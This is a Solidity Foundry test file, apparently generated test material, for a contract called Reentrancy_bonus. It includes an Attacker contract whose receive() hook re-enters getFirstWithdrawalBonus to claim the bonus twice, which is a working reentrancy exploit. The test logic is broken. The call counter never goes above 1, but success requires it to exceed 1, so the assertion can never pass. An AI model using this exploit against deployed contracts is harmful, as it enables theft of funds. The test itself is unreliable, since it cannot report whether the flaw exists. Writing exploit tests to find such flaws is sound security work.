
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";
import {stdstorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyReentrancy_bonus is Test {
    using stdstorage for StdStorage;
    
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;

    constructor(address victimAddress) {
        victim = Reentrancy_bonus(victimAddress);
    }

    function setupAttack(uint256 val) public {
        attackCallCount = 0;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        victim.getFirstWithdrawalBonus(address(this));
        
        if (attackCallCount > 1 && address(this).balance >= 200) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
